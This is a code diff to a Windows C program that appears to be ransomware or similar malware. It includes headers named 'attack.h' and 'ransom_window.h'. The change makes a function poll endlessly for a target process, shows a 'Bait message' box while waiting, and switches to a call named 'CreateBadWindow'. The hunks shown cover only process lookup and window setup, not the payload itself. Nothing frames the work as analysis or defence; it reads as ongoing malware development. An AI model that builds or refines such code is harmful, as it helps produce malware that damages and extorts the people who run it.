@@ -7,28 +7,47 @@
 #include "attack.h"
 #include "ransom_window.h"
 
-DWORD get_pid_from_list(const char *names[], size_t count)
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+DWORD get_pid_from_list(const char *names[], size_t count, DWORD check_interval_ms)
 {
     PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
+    DWORD pid = 0;
+    int shown_msg = 0; // Flag to show message box only once
 
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE)
-        return 1;
+    while (1) {
+        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snapshot == INVALID_HANDLE_VALUE) {
+            Sleep(check_interval_ms); // Wait and try again if snapshot failed
+            continue;
+        }
 
-    if (Process32First(snapshot, &pe)) {
-        do {
-            for (size_t i = 0; i < count; i++) {
-                if (_stricmp(pe.szExeFile, names[i]) == 0) {
-                    CloseHandle(snapshot);
-                    return pe.th32ProcessID;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+
+        if (Process32First(snapshot, &pe)) {
+            do {
+                for (size_t i = 0; i < count; i++) {
+                    if (_stricmp(pe.szExeFile, names[i]) == 0) {
+                        pid = pe.th32ProcessID;
+                        break;
+                    }
                 }
-            }
-        } while (Process32Next(snapshot, &pe));
-    }
+            } while (pid == 0 && Process32Next(snapshot, &pe));
+        }
 
-    CloseHandle(snapshot);
-    return 1; // No process found
+        CloseHandle(snapshot);
+
+        if (pid != 0) {
+            return pid; // Found a matching process
+        }
+        if (!shown_msg) {
+            MessageBoxA(NULL, "Bait message", "Info", MB_OK | MB_ICONINFORMATION);
+            shown_msg = 1;
+        }
+        Sleep(check_interval_ms); // No process found, wait before retrying
+    }
 }
 
 int main(void) {
@@ -43,7 +62,7 @@ int main(void) {
         return 1;
     }
 
-    DWORD pid = get_pid_from_list(processes, sizeof(processes) / sizeof(processes[0]));
+    DWORD pid = get_pid_from_list(processes, sizeof(processes) / sizeof(processes[0]), 1000);
 
     if (!pid)
         return 1;
@@ -97,7 +116,7 @@ int main(void) {
     int nCmdShow = SW_SHOW;
 
     // Call the window creation function
-    return CreateMyWindow(hInstance, nCmdShow);
+    return CreateBadWindow(hInstance, nCmdShow);
 
     return 0;
 }
